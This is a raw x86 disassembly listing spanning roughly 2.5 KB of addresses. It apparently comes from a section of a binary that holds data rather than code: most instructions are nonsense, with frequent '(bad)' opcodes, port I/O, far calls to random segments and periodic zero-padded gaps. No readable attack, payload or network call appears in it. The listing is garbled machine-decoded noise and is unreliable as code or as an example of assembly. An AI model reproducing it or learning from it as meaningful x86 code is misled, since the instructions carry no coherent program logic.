  42c800:	ins    BYTE PTR es:[edi],dx
  42c801:	repz mov WORD PTR [edi+0x1dcfa],ds
  42c808:	add    eax,0x58000001
  42c80d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c80e:	fwait
  42c80f:	out    0xd0,al
  42c811:	arpl   dx,dx
  42c813:	ds dec edi
  42c815:	and    cl,dl
  42c817:	push   esp
  42c818:	ins    BYTE PTR es:[edi],dx
  42c819:	in     eax,0x86
  42c81b:	push   eax
  42c81c:	fimul  WORD PTR [edi]
  42c81e:	out    dx,eax
  42c81f:	in     al,dx
  42c820:	inc    ecx
  42c821:	call   FWORD PTR [esi+0x7d]
  42c824:	xlat   BYTE PTR ds:[ebx]
  42c825:	cmp    DWORD PTR [edi],0xffffffba
  42c828:	pop    ss
  42c829:	fistp  QWORD PTR [ebx-0x4302821a]
  42c82f:	jp     0x42c88a
  42c831:	sbb    bl,al
  42c833:	cld    
  42c834:	enter  0xb4a9,0x9a
  42c838:	fld    QWORD PTR [ecx+0x4f876d47]
  42c83e:	push   edi
  42c83f:	add    eax,0x102b094c
  42c844:	outs   dx,DWORD PTR ds:[esi]
  42c845:	sub    dl,BYTE PTR [edi]
  42c847:	or     edi,DWORD PTR [ebx]
  42c849:	fwait
  42c84a:	mov    BYTE PTR [edx-0x34d7c68e],bh
  42c850:	inc    edx
  42c851:	inc    esp
  42c852:	mov    al,ds:0x256f13b1
  42c857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c858:	je     0x42c8d5
  42c85a:	dec    esi
  42c85b:	mov    ds:0x42236b24,al
  42c860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c861:	rcl    DWORD PTR [ecx-0x30ab7b24],cl
  42c867:	mov    ecx,0x15ce450b
  42c86c:	fs push cs
  42c86e:	call   0xdf98:0x6b13a3c4
  42c875:	stos   BYTE PTR es:[edi],al
  42c876:	ror    BYTE PTR [ebp-0x32fe8147],1
  42c87c:	(bad)  
  42c87d:	sbb    eax,0x44009366
  42c882:	popf   
  42c883:	retf   
  42c884:	xchg   edi,eax
  42c885:	push   es
  42c886:	loope  0x42c901
  42c888:	xor    DWORD PTR [ebx-0x37e6d776],edx
  42c88e:	xor    DWORD PTR [edx],esi
  42c890:	and    edi,DWORD PTR [edx+edi*2+0x60]
  42c894:	mov    BYTE PTR [ebx+esi*8+0x72],dh
  42c898:	in     al,dx
  42c899:	pop    ebp
  42c89a:	jbe    0x42c897
  42c89c:	call   0xe1dcd9a9
  42c8a1:	jmp    DWORD PTR [eax-0x490227d]
  42c8a7:	cmp    eax,0x9f9757bc
  42c8ac:	loopne 0x42c896
  42c8ae:	jno    0x42c832
  42c8b0:	int3   
  42c8b1:	mov    esp,0xebf64a10
  42c8b6:	cli    
  42c8b7:	mov    al,ds:0x4d374e50
  42c8bc:	inc    ebx
  42c8bd:	mov    ds:0xfb2e7f52,al
  42c8c2:	jmp    0xaf4cd88a
  42c8c7:	dec    esp
  42c8c8:	mov    dl,0xb
  42c8ca:	stc    
  42c8cb:	out    dx,al
  42c8cc:	ret    
  42c8cd:	and    ah,BYTE PTR [ecx-0x28]
  42c8d0:	xchg   ebx,eax
  42c8d1:	xchg   ecx,eax
  42c8d2:	nop
  42c8d3:	popf   
  42c8d4:	pusha  
  42c8d5:	jo     0x42c906
  42c8d7:	lock mov ds,WORD PTR [ebp-0xc33e04f]
  42c8de:	jo     0x42c8dc
  42c8e0:	test   eax,0x5afbb5b4
  42c8e5:	or     BYTE PTR [ebp-0x53eb2511],dh
  42c8eb:	mov    ebp,0x18c8ea01
  42c8f0:	and    ch,BYTE PTR [edx+0x2e0aa7f2]
  42c8f6:	pop    es
  42c8f7:	fs cmp eax,0xdaa013ee
  42c8fd:	jl     0x42c949
  42c8ff:	mov    al,BYTE PTR [edx+edx*4]
  42c902:	xor    al,0x84
  42c904:	arpl   di,bp
  42c906:	cs xor al,0x13
  42c909:	inc    esp
  42c90a:	in     al,0x89
  42c90c:	sub    BYTE PTR [ecx+0xa],bl
  42c90f:	push   ebp
  42c910:	add    BYTE PTR ss:[eax],al
	...
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0xf88e7cfc
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0xbb000001,al
  42c98d:	sbb    eax,0x5a72c089
  42c992:	cdq    
  42c993:	(bad)  
  42c994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c995:	popa   
  42c996:	or     DWORD PTR [esi+0x1],esp
  42c999:	xchg   esi,eax
  42c99a:	pop    ss
  42c99b:	add    DWORD PTR [edx+0x26f95d9d],ebp
  42c9a1:	inc    edx
  42c9a2:	je     0x42c936
  42c9a4:	div    DWORD PTR [esi+0x71]
  42c9a7:	mov    eax,0x973cd9c5
  42c9ac:	xchg   ebp,eax
  42c9ad:	mov    ecx,0xef8ea0cc
  42c9b2:	daa    
  42c9b3:	jp     0x42ca0f
  42c9b5:	sbb    ebp,esp
  42c9b7:	es aad 0x50
  42c9ba:	iret   
  42c9bb:	sha1msg2 xmm5,XMMWORD PTR [edi-0x993693b]
  42c9c3:	push   ecx
  42c9c4:	ds mov esi,0x625bdd50
  42c9ca:	jle    0x42c985
  42c9cc:	mov    ah,0x48
  42c9ce:	test   eax,0x4e014c4a
  42c9d3:	das    
  42c9d4:	(bad)  
  42c9d5:	mov    ch,0xd5
  42c9d7:	cdq    
  42c9d8:	fst    QWORD PTR [edi-0x15218346]
  42c9de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c9df:	pop    esp
  42c9e0:	lds    esp,FWORD PTR [ebp+0x5ccd4e01]
  42c9e6:	mov    bl,0xd7
  42c9e8:	inc    esp
  42c9e9:	bound  esi,QWORD PTR [bx-0x131]
  42c9ee:	jge    0x42c9fa
  42c9f0:	out    dx,eax
  42c9f1:	enter  0x299f,0x4e
  42c9f5:	xor    al,0xeb
  42c9f7:	inc    esi
  42c9f8:	jle    0x42c9eb
  42c9fa:	jo     0x42c9a5
  42c9fc:	inc    ebx
  42c9fd:	je     0x42ca01
  42c9ff:	les    ecx,FWORD PTR [eax+0x52]
  42ca02:	and    al,0xcc
  42ca04:	lock rol BYTE PTR [edi-0x5f],0x9d
  42ca09:	mov    dh,0x93
  42ca0b:	mov    ebx,0x4ea5aee4
  42ca10:	jle    0x42ca45
  42ca12:	mov    ch,0x4b
  42ca14:	cli    
  42ca15:	pop    eax
  42ca16:	sti    
  42ca17:	(bad)  
  42ca18:	cld    
  42ca19:	ja     0x42ca60
  42ca1b:	ja     0x42ca43
  42ca1d:	in     eax,dx
  42ca1e:	and    eax,0xf22ce33a
  42ca23:	aam    0x17
  42ca25:	clc    
  42ca26:	jo     0x42c9f7
  42ca28:	xchg   esi,eax
  42ca29:	aam    0xf6
  42ca2b:	scas   eax,DWORD PTR es:[edi]
  42ca2c:	loope  0x42ca00
  42ca2e:	mov    ds:0x2d0988ef,eax
  42ca33:	sub    esi,ebp
  42ca35:	sub    DWORD PTR cs:[ecx-0x7a],eax
  42ca39:	inc    eax
  42ca3a:	mov    DWORD PTR [esi+ebp*1+0x7ccd24eb],esi
  42ca41:	push   cs
  42ca42:	aas    
  42ca43:	jnp    0x42ca18
  42ca45:	push   DWORD PTR [ebp-0x6f51103a]
  42ca4b:	adc    dl,cl
  42ca4d:	dec    ebp
  42ca4e:	adc    ecx,DWORD PTR [edi+0xa]
  42ca51:	pushf  
  42ca52:	mov    ebp,0x982f2feb
  42ca57:	and    DWORD PTR [ebx+eiz*2],ecx
  42ca5a:	jne    0x42c9fd
  42ca5c:	cmp    eax,0x391a20d0
  42ca61:	mov    cl,0x26
  42ca63:	sub    al,0xab
  42ca65:	cdq    
  42ca66:	xor    BYTE PTR [ebx],dl
  42ca68:	xor    DWORD PTR [eax],esp
  42ca6a:	dec    ebp
  42ca6b:	cs popf 
  42ca6d:	gs mov bl,0x17
  42ca70:	mov    ah,0xa0
  42ca72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca73:	call   0x75ab:0x75bb4814
  42ca7a:	jb     0x42caa9
  42ca7c:	inc    esi
  42ca7d:	loope  0x42cad3
  42ca7f:	retf   0xaaba
  42ca82:	fstp   TBYTE PTR [eax-0x3913c019]
  42ca88:	or     al,0xa8
  42ca8a:	pop    DWORD PTR es:[eax+0x510f3409]
	...
  42caf1:	add    BYTE PTR [eax],al
  42caf3:	add    BYTE PTR [edi-0x2be7726],ah
  42caf9:	push   ebx
  42cafa:	out    dx,eax
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0x13ed6ec0]
  42cb02:	repnz sub eax,DWORD PTR [edi+ebx*8]
  42cb06:	add    DWORD PTR [eax],eax
  42cb08:	add    eax,0xef000001
  42cb0d:	es jo  0x42ca90
  42cb10:	jmp    0x6ce9:0x87dae4d8
  42cb17:	and    BYTE PTR [ebp-0x3b],bl
  42cb1a:	jge    0x42caff
  42cb1c:	push   esp
  42cb1d:	jae    0x42cb22
  42cb1f:	xchg   ebp,eax
  42cb20:	jmp    0x42cac9
  42cb22:	mov    fs,WORD PTR ds:0x9d46224b
  42cb28:	mov    WORD PTR [esi+0x2b],ss
  42cb2b:	sub    al,0xef
  42cb2d:	xchg   ebp,eax
  42cb2e:	pop    ebp
  42cb2f:	xor    BYTE PTR [edx-0x79],dh
  42cb32:	stos   BYTE PTR es:[edi],al
  42cb33:	jne    0x42cbb0
  42cb35:	mov    eax,0xdcb13b34
  42cb3a:	ja     0x42cb66
  42cb3c:	mov    dl,0xf3
  42cb3e:	xchg   esp,eax
  42cb3f:	ret    0x3411
  42cb42:	jmp    0x42cb76
  42cb44:	xor    DWORD PTR [edx-0x23],ecx
  42cb47:	sahf   
  42cb48:	aas    
  42cb49:	rcl    BYTE PTR [ebp+0x5113bd1c],1
  42cb4f:	enter  0x7036,0x3
  42cb53:	pop    ds
  42cb54:	pop    edi
  42cb55:	lods   al,BYTE PTR ds:[esi]
  42cb56:	mov    ah,0x30
  42cb58:	std    
  42cb59:	sbb    esi,DWORD PTR [ebx+0x688a138e]
  42cb5f:	xor    ebx,edx
  42cb61:	mov    ah,0xf5
  42cb63:	xor    BYTE PTR [ecx-0x70],0x45
  42cb67:	sub    DWORD PTR [edx+esi*2-0x29d0c57f],ebp
  42cb6e:	sbb    BYTE PTR [esi-0x1b6b3240],bh
  42cb74:	or     al,BYTE PTR [esi+0x6f76c539]
  42cb7a:	test   bh,ah
  42cb7c:	add    ah,BYTE PTR ds:0xc5b708f9
  42cb82:	les    eax,FWORD PTR [ecx]
  42cb84:	and    al,0x3b
  42cb86:	loope  0x42cb37
  42cb88:	push   ss
  42cb89:	xchg   ecx,eax
  42cb8a:	add    DWORD PTR [ecx+0x55],ebx
  42cb8d:	and    dl,BYTE PTR [ecx+0x2d]
  42cb90:	xor    BYTE PTR [ebp+ebx*2-0xf],bh
  42cb94:	gs jns 0x42cb8d
  42cb97:	stc    
  42cb98:	push   0x8c0798f9
  42cb9d:	and    eax,0x7d809c3c
  42cba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cba3:	inc    ebp
  42cba4:	push   eax
  42cba5:	dec    BYTE PTR [eax+0x3dae7bd9]
  42cbab:	cmc    
  42cbac:	jg     0x42cbad
  42cbae:	popa   
  42cbaf:	bound  esp,QWORD PTR ds:0x9a0b7461
  42cbb5:	dec    ecx
  42cbb6:	outs   dx,BYTE PTR ds:[esi]
  42cbb7:	xchg   ecx,eax
  42cbb8:	bound  edx,QWORD PTR [edi+edx*2+0x38]
  42cbbc:	outs   dx,DWORD PTR ds:[esi]
  42cbbd:	push   ds
  42cbbe:	mov    dl,0x30
  42cbc0:	cld    
  42cbc1:	popf   
  42cbc2:	pop    ds
  42cbc3:	adc    al,0x7d
  42cbc5:	pop    edx
  42cbc6:	mov    bl,cl
  42cbc8:	xor    ecx,ebp
  42cbca:	mov    edi,0xdf857029
  42cbcf:	xor    dl,cl
  42cbd1:	xchg   BYTE PTR [eax],ch
  42cbd3:	add    ecx,DWORD PTR [edx]
  42cbd5:	inc    edx
  42cbd6:	add    BYTE PTR [esi],cl
  42cbd8:	jbe    0x42cbb4
  42cbda:	push   0x5fe07207
  42cbdf:	sub    BYTE PTR [eax+0x4684f012],0x39
  42cbe6:	mov    ebx,DWORD PTR ds:0x4b83bc17
  42cbec:	retf   
  42cbed:	or     ebx,DWORD PTR [ecx+0x4007b8aa]
  42cbf3:	jl     0x42cb76
  42cbf5:	and    al,0x5b
  42cbf7:	lahf   
  42cbf8:	xchg   edi,eax
  42cbf9:	add    al,0x63
  42cbfb:	push   ebp
  42cbfc:	mov    ebx,0x66612a3
  42cc01:	out    dx,al
  42cc02:	dec    ebp
  42cc03:	mov    fs,WORD PTR [edx]
  42cc05:	sbb    edi,ebp
  42cc07:	ins    BYTE PTR es:[edi],dx
  42cc08:	clc    
  42cc09:	pop    edi
  42cc0a:	inc    edx
  42cc0b:	push   ecx
  42cc0c:	fmulp  st(2),st
  42cc0e:	adc    ah,ch
  42cc10:	push   0x0
	...
  42cc72:	add    BYTE PTR [eax],al
  42cc74:	jg     0x42cc78
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0xbcc2622
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0x12000001
  42cc8d:	mov    eax,0xc6da4097
  42cc92:	sub    al,0x2d
  42cc94:	je     0x42cd09
  42cc96:	xchg   esp,eax
  42cc97:	sbb    al,0x4
  42cc99:	pop    ebx
  42cc9a:	sub    DWORD PTR [edx-0x6a80ceed],esi
  42cca0:	xor    BYTE PTR [esi+0x6e056b3c],ch
  42cca6:	xor    eax,ebx
  42cca8:	test   eax,0xdee3750a
  42ccad:	nop
  42ccae:	imul   edi,DWORD PTR [ecx-0x55],0xceb9d88b
  42ccb5:	dec    edi
  42ccb6:	pop    ss
  42ccb7:	ror    BYTE PTR [esi-0x32],cl
  42ccba:	adc    ch,BYTE PTR [esi]
  42ccbc:	dec    si
  42ccbe:	adc    al,0x1d
  42ccc0:	retf   0x8094
  42ccc3:	imul   eax,DWORD PTR [ebx+0x47ad9ba],0x548e35d9
  42cccd:	inc    eax
  42ccce:	imul   esp,DWORD PTR [esi-0x15526a62],0xfffffffc
  42ccd5:	jae    0x42cd2b
  42ccd7:	xchg   ecx,eax
  42ccd8:	gs pop ds
  42ccda:	mov    cl,0x84
  42ccdc:	pushf  
  42ccdd:	or     al,0x2d
  42ccdf:	mov    esp,0xedc44b49
  42cce4:	loop   0x42cd04
  42cce6:	daa    
  42cce7:	mov    dh,BYTE PTR [edx-0x4e]
  42ccea:	push   eax
  42cceb:	and    eax,esp
  42cced:	cmp    eax,0x9ab4abfb
  42ccf2:	lds    esi,FWORD PTR ds:0xcaa6501a
  42ccf8:	mov    bh,0x8c
  42ccfa:	das    
  42ccfb:	inc    eax
  42ccfc:	sahf   
  42ccfd:	pop    ebx
  42ccfe:	mov    eax,ds:0x6ead0d56
  42cd03:	call   0x9651:0x86fa05b1
  42cd0a:	rol    DWORD PTR [edi-0x39],1
  42cd0d:	js     0x42cd8b
  42cd0f:	push   es
  42cd10:	or     BYTE PTR [ebx],0xea
  42cd13:	dec    edx
  42cd14:	sbb    eax,0x36796c49
  42cd19:	shl    BYTE PTR [esi-0x9],1
  42cd1c:	sub    BYTE PTR [ebx+0x76b5eb90],bh
  42cd22:	loope  0x42cd8c
  42cd24:	sbb    eax,0xfa941c7d
  42cd29:	ja     0x42cd99
  42cd2b:	imul   ecx,DWORD PTR [esi],0x3c8d94e6
  42cd31:	jge    0x42cd72
  42cd33:	cli    
  42cd34:	xor    al,0x1a
  42cd36:	push   ebp
  42cd37:	adc    BYTE PTR [ebp+ecx*4-0x16],bl
  42cd3b:	into   
  42cd3c:	inc    eax
  42cd3d:	call   0x245b:0xec8fc615
  42cd44:	xchg   DWORD PTR ss:0x51ce4802,edi
  42cd4b:	sbb    esp,DWORD PTR [eax+ebx*2-0x4ca910c4]
  42cd52:	(bad)  
  42cd53:	pop    ebp
  42cd54:	leave  
  42cd55:	(bad)  
  42cd56:	dec    al
  42cd58:	inc    ebp
  42cd59:	jmp    0x42cda4
  42cd5b:	add    eax,0x7cc0113d
  42cd60:	(bad)  
  42cd61:	ins    BYTE PTR es:[edi],dx
  42cd62:	adc    ch,ah
  42cd64:	into   
  42cd65:	mov    dl,0x4d
  42cd67:	scas   al,BYTE PTR es:[edi]
  42cd68:	inc    ebx
  42cd69:	bts    DWORD PTR [edx+0x258b0e3e],esp
  42cd70:	pop    ds
  42cd71:	xchg   ecx,eax
  42cd72:	test   DWORD PTR [eax-0x6e0f5a6c],0x1721c815
  42cd7c:	mov    eax,0xc721aeeb
  42cd81:	pop    edi
  42cd82:	mov    al,0xad
  42cd84:	push   es
  42cd85:	lods   al,BYTE PTR ds:[esi]
  42cd86:	mov    BYTE PTR [eax-0x33b7e861],cl
  42cd8c:	icebp  
  42cd8d:	add    esi,DWORD PTR [edi]
  42cd8f:	mov    DWORD PTR [ecx+0x0],esi
	...
  42cdf2:	add    BYTE PTR [eax],al
  42cdf4:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x34
  42ce01:	ins    DWORD PTR es:[edi],dx
  42ce02:	int3   
  42ce03:	hlt    
  42ce04:	push   cs
  42ce05:	loope  0x42ce08
  42ce07:	add    BYTE PTR ds:0x73000001,al
  42ce0d:	add    eax,0x33f1739d
  42ce12:	mov    esi,0x2a042b39
  42ce17:	les    ecx,FWORD PTR ds:[ebx+0x7]
  42ce1b:	lea    edi,[edx+0x6c613e70]
  42ce21:	inc    ebx
  42ce22:	xlat   BYTE PTR ds:[ebx]
  42ce23:	fdiv   DWORD PTR [esi]
  42ce25:	in     eax,dx
  42ce26:	or     al,0x4
  42ce28:	imul   edx,DWORD PTR [eax-0x6decdfa2],0x2
  42ce2f:	iret   
  42ce30:	repnz in eax,dx
  42ce32:	xor    edx,DWORD PTR [ecx-0x31]
  42ce35:	lods   al,BYTE PTR ds:[esi]
  42ce36:	cmp    BYTE PTR [edx+eax*4+0x7eeefa59],bl
  42ce3d:	mov    dh,0xec
  42ce3f:	push   cs
  42ce40:	fidiv  WORD PTR [ebx]
  42ce42:	std    
  42ce43:	nop
  42ce44:	xlat   BYTE PTR ds:[ebx]
  42ce45:	neg    BYTE PTR [edi+ebp*8]
  42ce48:	aaa    
  42ce49:	ret    0x8bc5
  42ce4c:	(bad)  
  42ce4d:	aad    0x14
  42ce4f:	push   ss
  42ce50:	int3   
  42ce51:	out    0x69,al
  42ce53:	cmp    cl,0x80
  42ce56:	mov    esp,0x3ad331d7
  42ce5b:	xchg   ebp,eax
  42ce5c:	and    eax,0xa19ea2fb
  42ce61:	push   edx
  42ce62:	push   0xfffffffe
  42ce64:	iret   
  42ce65:	mov    ds:0x29686020,eax
  42ce6a:	out    dx,al
  42ce6b:	test   DWORD PTR [edx],edi
  42ce6d:	dec    esi
  42ce6e:	dec    ebp
  42ce6f:	xchg   ecx,eax
  42ce70:	add    BYTE PTR ds:0x42ece1f5,al
  42ce76:	xchg   DWORD PTR [eax],ebx
  42ce78:	(bad)
  42ce7b:	jb     0x42ce64
  42ce7d:	inc    edx
  42ce7e:	sub    cl,cl
  42ce80:	inc    esi
  42ce81:	iret   
  42ce82:	pop    ebx
  42ce83:	jmp    0xb04a:0x240b5986
  42ce8a:	mov    al,ds:0x75a54066
  42ce8f:	int3   
  42ce90:	(bad)
  42ce94:	cmp    al,0x9a
  42ce96:	test   dl,al
  42ce98:	not    edx
  42ce9a:	inc    esi
  42ce9b:	hlt    
  42ce9c:	xchg   BYTE PTR [esi-0x29],al
  42ce9f:	lods   al,BYTE PTR ds:[esi]
  42cea0:	sub    bh,dh
  42cea2:	mov    eax,ds:0x6be17688
  42cea7:	(bad)  
  42cea8:	js     0x42ce2c
  42ceaa:	sbb    ch,0x30
  42cead:	fsubr  QWORD PTR [esi-0x38]
  42ceb0:	nop
  42ceb1:	pop    es
  42ceb2:	rol    esp,0xf4
  42ceb5:	fdivp  st(1),st
  42ceb7:	outs   dx,DWORD PTR ds:[esi]
  42ceb8:	sub    cl,BYTE PTR [eax+ecx*2-0x1c]
  42cebc:	mov    esi,0xe0fad7e6
  42cec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cec2:	inc    ecx
  42cec3:	jno    0x42ce47
  42cec5:	and    ch,BYTE PTR [esi+0x3689e1a7]
  42cecb:	je     0x42ce92
  42cecd:	int3   
  42cece:	sahf   
  42cecf:	push   esp
  42ced0:	jp     0x42cecc
  42ced2:	ins    DWORD PTR es:[edi],dx
  42ced3:	or     BYTE PTR cs:[ecx+0x2db57be3],dl
  42ceda:	adc    ebp,DWORD PTR [ebx+ebx*4-0x15d6b97c]
  42cee1:	lods   eax,DWORD PTR ds:[esi]
  42cee2:	xchg   ecx,eax
  42cee3:	sub    bh,BYTE PTR ds:0x1bcd002a
  42cee9:	dec    ebx
  42ceea:	jecxz  0x42ceb4
  42ceec:	sub    bl,BYTE PTR [ecx]
  42ceee:	adc    edx,DWORD PTR [ebp+0x744aef27]
  42cef4:	and    ecx,DWORD PTR [esi+0x43101a00]
  42cefa:	cld    
  42cefb:	jge    0x42cf38
  42cefd:	cmc    
  42cefe:	xchg   BYTE PTR [edx+edi*8-0x5c63fa85],ah
  42cf05:	cs dec ebp
  42cf07:	popa   
  42cf08:	sbb    ecx,DWORD PTR [eax+0x48fb740c]
  42cf0e:	push   ebp
  42cf0f:	mov    ah,0xbe
	...
  42cf71:	add    BYTE PTR [eax],al
  42cf73:	add    BYTE PTR [ebx+0x3d],dh
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    ecx,FWORD PTR [edi+0x13b47890]
  42cf85:	loop   0x42cf88
  42cf87:	add    BYTE PTR ds:0x42000001,al
  42cf8d:	pop    sp
  42cf8f:	lds    esi,FWORD PTR [ebx-0x55697cfd]
  42cf95:	loop   0x42cfb6
  42cf97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf98:	mov    eax,0x6ebeca74
  42cf9d:	xchg   esi,eax
  42cf9e:	inc    edi
  42cf9f:	dec    ebx
  42cfa0:	or     al,BYTE PTR [esi]
  42cfa2:	adc    eax,0x5bde06be
  42cfa7:	pushf  
  42cfa8:	jmp    0x42d00f
  42cfaa:	push   0xfe6ed084
  42cfaf:	xchg   DWORD PTR [edx-0x132a554f],ebx
  42cfb5:	xchg   ecx,eax
  42cfb6:	adc    DWORD PTR [edx],eax
  42cfb8:	es mov esp,0xdf0c1766
  42cfbe:	mov    edx,0x222160ef
  42cfc3:	popa   
  42cfc4:	push   ecx
  42cfc5:	sbb    eax,0x92af3545
  42cfca:	jg     0x42cf92
  42cfcc:	xchg   ecx,eax
  42cfcd:	mov    ebx,0x1cd512c
  42cfd2:	dec    ebp
  42cfd3:	outs   dx,DWORD PTR ds:[esi]
  42cfd4:	pusha  
  42cfd5:	push   esi
  42cfd6:	shl    DWORD PTR [eax+0x31],0x48
  42cfda:	mov    edx,0xdd3e32c0
  42cfdf:	sub    al,0x99
  42cfe1:	inc    ebx
  42cfe2:	(bad)  
  42cfe3:	lahf   
  42cfe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cfe5:	pop    edx
  42cfe6:	popf   
  42cfe7:	call   FWORD PTR [esi-0x1a77520]
  42cfed:	mov    ebp,0xfafd6986
  42cff2:	dec    edx
  42cff3:	or     eax,0x22288f9c
  42cff8:	psubusw mm1,QWORD PTR [ebx-0x29]
  42cffc:	pop    eax
  42cffd:	mov    al,ds:0xace5dee0
  42d002:	scas   eax,DWORD PTR es:[edi]
  42d003:	mov    al,BYTE PTR [esi]
  42d005:	or     al,0x9c
  42d007:	into   
  42d008:	mov    al,0x20
  42d00a:	addr16 ss ret 0x2d05
  42d00f:	lods   al,BYTE PTR ds:[esi]
  42d010:	pop    eax
  42d011:	push   esp
  42d012:	cs jb  0x42d059
  42d015:	mov    edi,0x6f61f483
  42d01a:	cmp    BYTE PTR [eax],cl
  42d01c:	xchg   BYTE PTR [edi+0x3b],ah
  42d01f:	retf   0x8570
  42d022:	inc    ecx
  42d023:	dec    eax
  42d024:	inc    esi
  42d025:	inc    ebx
  42d026:	and    edi,edx
  42d028:	jb     0x42cfc3
  42d02a:	dec    eax
  42d02b:	int3   
  42d02c:	xor    dl,BYTE PTR [edi]
  42d02e:	jo     0x42d053
  42d030:	out    0x25,al
  42d032:	xchg   ebp,eax
  42d033:	cmp    al,0x2e
  42d035:	(bad)  
  42d036:	arpl   WORD PTR [esi+edi*1-0x21],sp
  42d03a:	fcomp  st(7)
  42d03c:	sbb    BYTE PTR [eax+0x31539e],bh
  42d042:	jecxz  0x42d037
  42d044:	dec    eax
  42d045:	push   edi
  42d046:	leave  
  42d047:	cmp    bh,0xe1
  42d04a:	mov    ds:0x57d2e7a6,eax
  42d04f:	sti    
  42d050:	fcomp  st(4)
  42d052:	jo     0x42d0bc
  42d054:	call   0xa7b5:0x53d1ce0b
  42d05b:	in     al,0x8f
  42d05d:	push   ebp
  42d05e:	or     eax,0xd79681d3
  42d063:	fcmovne st,st(3)
  42d065:	fwait
  42d066:	inc    ebp
  42d067:	push   cs
  42d068:	add    bl,cl
  42d06a:	jnp    0x42cff6
  42d06c:	sar    BYTE PTR [ebx+0x34096415],1
  42d072:	out    dx,al
  42d073:	pop    ecx
  42d074:	xchg   edi,eax
  42d075:	sub    eax,0x136446b3
  42d07a:	jle    0x42d004
  42d07c:	push   ecx
  42d07d:	pushf  
  42d07e:	and    ecx,edi
  42d080:	xor    ebx,edi
  42d082:	scas   al,BYTE PTR es:[edi]
  42d083:	repz in al,dx
  42d085:	mov    ch,0x3
  42d087:	cmp    DWORD PTR [ebp-0x4320a52a],eax
  42d08d:	sti    
  42d08e:	data16 fcmovne st,st(3)
	...
  42d0f1:	add    BYTE PTR [eax],al
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [ebx+eiz*1-0x3d],ch
  42d103:	push   ecx
  42d104:	sbb    bl,ah
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    eax,0xd3000001
  42d10d:	xor    DWORD PTR ds:0xb2434b9c,esp
  42d113:	jmp    0x99:0x55c934fd
  42d11a:	push   ebp
  42d11b:	add    eax,0xf4d9b08
  42d120:	xor    BYTE PTR [ebx+0x8],bl
  42d123:	lds    esp,FWORD PTR [ebx-0x2c]
  42d126:	and    dl,0x8f
  42d129:	pop    ds
  42d12a:	xchg   ebx,eax
  42d12b:	jbe    0x42d0c0
  42d12d:	rcr    DWORD PTR [esi+eax*1-0x75],cl
  42d131:	sub    DWORD PTR [ebx],esi
  42d133:	jle    0x42d121
  42d135:	adc    eax,0x9951409b
  42d13a:	cmp    dh,cl
  42d13c:	pop    ebp
  42d13d:	pop    es
  42d13e:	mov    al,0xea
  42d140:	lea    edx,[ecx]
  42d142:	add    eax,0x3f01087c
  42d147:	mov    bh,0xcd
  42d149:	mov    al,0xe6
  42d14b:	leave  
  42d14c:	dec    esp
  42d14d:	lods   eax,DWORD PTR ds:[esi]
  42d14e:	ds pop esi
  42d150:	shr    DWORD PTR [ebp+0x443bcae6],0xbe
  42d157:	push   edi
  42d158:	mov    fs,WORD PTR [edx-0x18]
  42d15b:	dec    edi
  42d15c:	inc    esi
  42d15d:	daa    
  42d15e:	dec    ecx
  42d15f:	(bad)  
  42d160:	adc    eax,0xb1c8f316
  42d165:	jo     0x42d14e
  42d167:	retf   0x4110
  42d16a:	mov    dh,0xd1
  42d16c:	ds ins BYTE PTR es:[edi],dx
  42d16e:	cmc    
  42d16f:	mov    edx,0x3ef65c3c
  42d174:	cli    
  42d175:	pushf  
  42d176:	fisttp DWORD PTR [ebp+0x59607eb9]
  42d17c:	repnz mov eax,0x2cbc4441
  42d182:	dec    edi
  42d183:	jmp    0x4cde791e
  42d188:	pusha  
  42d189:	xchg   ebp,eax
  42d18a:	in     eax,0x28
  42d18c:	cdq    
  42d18d:	pop    ebx
  42d18e:	rol    DWORD PTR [ecx+esi*4+0x5c],cl
  42d192:	pop    esp
  42d193:	mov    bh,0xf1
  42d195:	and    al,0x54
  42d197:	outs   dx,DWORD PTR ds:[esi]
  42d198:	in     eax,dx
  42d199:	pusha  
  42d19a:	cld    
  42d19b:	js     0x42d166
  42d19d:	sub    eax,0xc8fe05e3
  42d1a2:	out    dx,eax
  42d1a3:	push   ecx
  42d1a4:	inc    esp
  42d1a5:	icebp  
  42d1a6:	call   0x9adc:0xf598afe6
  42d1ad:	jmp    0x42d1af
  42d1af:	addr16 xchg edi,eax
  42d1b1:	dec    edi
  42d1b2:	inc    ebx
  42d1b3:	push   eax
  42d1b4:	add    DWORD PTR [ecx+0x57dd95b6],ecx
  42d1ba:	scas   eax,DWORD PTR es:[edi]
  42d1bb:	pop    esp
